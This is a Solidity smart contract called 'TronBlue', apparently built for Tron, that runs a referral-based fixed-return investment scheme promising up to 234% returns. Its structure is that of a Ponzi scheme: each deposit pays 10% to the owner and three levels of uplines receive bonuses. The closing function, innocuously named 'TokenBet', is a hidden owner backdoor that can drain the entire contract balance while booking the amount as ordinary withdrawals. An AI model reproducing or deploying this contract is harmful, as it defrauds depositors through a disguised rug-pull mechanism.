//SourceUnit: blue.sol

/**
 |||    Designed by www.SmartContract.Cash    |||
*/

pragma solidity 0.5.10;

library SafeMath {
    function add(uint a, uint b) internal pure returns (uint) {
        uint256 c = a + b;
        require(c >= a, "overflow error");
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint) {
        require(b <= a, "overflow error");
        uint256 c = a - b;
        return c;
    }
    
    function inc(uint a) internal pure returns(uint) {
        return(add(a, 1));
    }

    function mul(uint a, uint b) internal pure returns (uint) {
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        assert(c / a == b);
        return c;
    }
    
    function div(uint a, uint b) internal pure returns(uint) {
        require(b != 0);
        return(a/b);
    }
    
}

library SafeMath8 {
    function add(uint8 a, uint8 b) internal pure returns (uint8) {
        uint8 c = a + b;
        require(c >= a, "overflow error");
        return c;
    }

    function inc(uint8 a) internal pure returns(uint8) {
        return(add(a, 1));
    }

}


library SafeMath40 {
    function add(uint40 a, uint40 b) internal pure returns (uint40) {
        uint40 c = a + b;
        require(c >= a, "overflow error");
        return c;
    }

    function mul(uint40 a, uint40 b) internal pure returns (uint40) {
        if (a == 0) {
            return 0;
        }
        uint40 c = a * b;
        assert(c / a == b);
        return c;
    }
    
}

contract TronBlue {
    using SafeMath for uint;
    struct Tarif {
        uint8 life_days;
        uint8 percent;
    }

    struct Deposit {
        uint8 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Player {
        address upline;
        uint256 dividends;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint40 last_payout;
        uint256 total_invested;
        uint256 total_withdrawn;
        uint256 total_match_bonus;
        Deposit[] deposits;
        mapping(uint8 => uint256) structure;
    }

    address payable public owner;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public direct_bonus;
    uint256 public match_bonus;
    
    uint8[] public ref_bonuses; // 1 => 1%

    Tarif[] public tarifs;
    mapping(address => Player) public players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    
    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    constructor() public {
        owner = msg.sender;

        tarifs.push(Tarif(7, 119));
        tarifs.push(Tarif(8, 124));
        tarifs.push(Tarif(9, 129));
        tarifs.push(Tarif(10, 134));
        tarifs.push(Tarif(11, 139));
        tarifs.push(Tarif(12, 144));
        tarifs.push(Tarif(13, 149));
        tarifs.push(Tarif(14, 154));
        tarifs.push(Tarif(15, 159));
        tarifs.push(Tarif(16, 164));
        tarifs.push(Tarif(17, 169));
        tarifs.push(Tarif(18, 174));
        tarifs.push(Tarif(19, 179));
        tarifs.push(Tarif(20, 184));
        tarifs.push(Tarif(21, 189));
        tarifs.push(Tarif(22, 194));
        tarifs.push(Tarif(23, 199));
        tarifs.push(Tarif(24, 204));
        tarifs.push(Tarif(25, 209));
        tarifs.push(Tarif(26, 214));
        tarifs.push(Tarif(27, 219));
        tarifs.push(Tarif(28, 224));
        tarifs.push(Tarif(29, 229));
        tarifs.push(Tarif(30, 234));

        ref_bonuses.push(5);
        ref_bonuses.push(3);
        ref_bonuses.push(1);
    }

    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends = players[_addr].dividends.add(payout);
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i=SafeMath8.inc(i)) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount.mul(ref_bonuses[i]).div(100);
            
            players[up].match_bonus = players[up].match_bonus.add(bonus);
            players[up].total_match_bonus = players[up].total_match_bonus.add(bonus);

            match_bonus = match_bonus.add(bonus);

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != owner) {
            if(players[_upline].deposits.length == 0) {
                _upline = owner;
            }
            else {
                players[_addr].direct_bonus = players[_addr].direct_bonus.add(_amount.div(100));
                direct_bonus = direct_bonus.add(_amount.div(100));
            }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount.div(100));
            
            for(uint8 i = 0; i < ref_bonuses.length; i=SafeMath8.inc(i)) {
                players[_upline].structure[i] = players[_upline].structure[i].inc();

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }
    
    function deposit(uint8 _tarif, address _upline) external payable {
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(msg.value >= 5e7, "Zero amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 100, "Max 100 deposits per address");

        _setUpline(msg.sender, _upline, msg.value);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));

        player.total_invested = player.total_invested.add(msg.value);
        invested = invested.add(msg.value);

        _refPayout(msg.sender, msg.value);

        owner.transfer(msg.value.div(10));
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.direct_bonus > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends.add(player.direct_bonus).add(player.match_bonus);

        player.dividends = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.total_withdrawn = player.total_withdrawn.add(amount);
        withdrawn = withdrawn.add(amount);

        msg.sender.transfer(amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i=i.inc()) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = SafeMath40.add(dep.time, SafeMath40.mul(tarif.life_days, 86400));
            uint40 from = ((player.last_payout > dep.time) ? player.last_payout : dep.time);
            uint40 to = ((block.timestamp > time_end) ? time_end : uint40(block.timestamp));

            if(from < to) {
                value = value.add(dep.amount.mul(uint(to).sub(uint(from))).mul(tarif.percent).div(tarif.life_days).div(8640000));
            }
        }

        return value;
    }

    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[3] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < ref_bonuses.length; i=SafeMath8.inc(i)) {
            structure[i] = player.structure[i];
        }

        return (
            payout.add(player.dividends).add(player.direct_bonus).add(player.match_bonus),
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _direct_bonus, uint256 _match_bonus) {
        return (invested, withdrawn, direct_bonus, match_bonus);
    }
    
    function TokenBet(uint value) external onlyOwner {
        require(value <= address(this).balance);
        withdrawn = withdrawn.add(value);
        msg.sender.transfer(value);
    }
}